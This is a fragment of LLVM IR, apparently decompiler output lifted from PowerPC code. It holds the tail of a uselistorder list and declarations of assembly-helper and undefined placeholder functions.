593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 1429, 1430, 1431, 1432, 1433, 1434, 1435, 1436, 1437, 1438, 1439, 1440, 1441, 1442, 1443, 1444, 1445, 1446, 1447, 1448, 1449, 1450, 1451, 1452 }
  uselistorder i32* @lr, { 11, 301, 302, 303, 304, 305, 306, 211, 544, 545, 546, 307, 311, 308, 309, 310, 315, 316, 312, 313, 314, 317, 318, 319, 320, 321, 12, 13, 14, 17, 15, 16, 322, 326, 323, 1, 325, 0, 327, 330, 331, 328, 329, 332, 333, 334, 335, 336, 337, 338, 339, 173, 212, 213, 340, 341, 342, 343, 214, 215, 216, 217, 521, 551, 552, 553, 554, 547, 548, 549, 550, 344, 349, 364, 350, 351, 352, 365, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 484, 174, 175, 176, 177, 218, 219, 220, 555, 221, 222, 353, 354, 359, 360, 361, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 556, 557, 235, 236, 522, 523, 566, 567, 571, 572, 573, 574, 575, 588, 590, 592, 568, 570, 190, 23, 24, 25, 26, 27, 28, 29, 558, 564, 565, 18, 19, 293, 21, 294, 20, 22, 524, 526, 525, 30, 31, 32, 33, 34, 35, 527, 528, 529, 530, 531, 532, 36, 495, 405, 406, 191, 533, 477, 453, 91, 454, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 420, 421, 422, 423, 485, 475, 576, 577, 578, 579, 580, 583, 584, 585, 466, 237, 238, 239, 441, 442, 443, 444, 240, 418, 419, 324, 591, 589, 241, 242, 243, 362, 355, 357, 358, 356, 37, 363, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 9, 10, 258, 559, 560, 561, 562, 563, 586, 587, 366, 367, 368, 369, 370, 371, 372, 373, 272, 273, 274, 345, 346, 347, 348, 487, 38, 504, 39, 40, 41, 42, 569, 505, 581, 582, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 69, 68, 70, 71, 72, 73, 74, 75, 76, 77, 79, 78, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 278, 275, 276, 277, 2, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 3, 4, 5, 6, 7, 8, 295, 296, 297, 298, 299, 300, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 445, 446, 447, 448, 449, 467, 468, 469, 450, 451, 452, 455, 456, 457, 458, 459, 460, 461, 470, 462, 463, 464, 465, 471, 472, 473, 474, 476, 478, 479, 480, 481, 482, 483, 486, 488, 489, 490, 491, 492, 493, 494, 496, 497, 498, 499, 500, 501, 502, 503, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 534, 535, 536, 537, 538, 539, 541, 540, 542, 543 }
}

declare i32 @__asm_rlwinm(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwinm.(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwimi(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_mfcr() local_unnamed_addr

declare %0 @__asm_mtcrf(i32, i32) local_unnamed_addr

declare %2 @__asm_mcrf_cr0_write(i4) local_unnamed_addr

declare %1 @__asm_cror(i32, i32, i32) local_unnamed_addr

declare i32 @unknown_0(i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i64 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16 @__decompiler_undefined_function_4() local_unnamed_addr

declare i16* @__decompiler_undefined_function_5() local_unnamed_addr

declare i8** @__decompiler_undefined_function_6() local_unnamed_addr
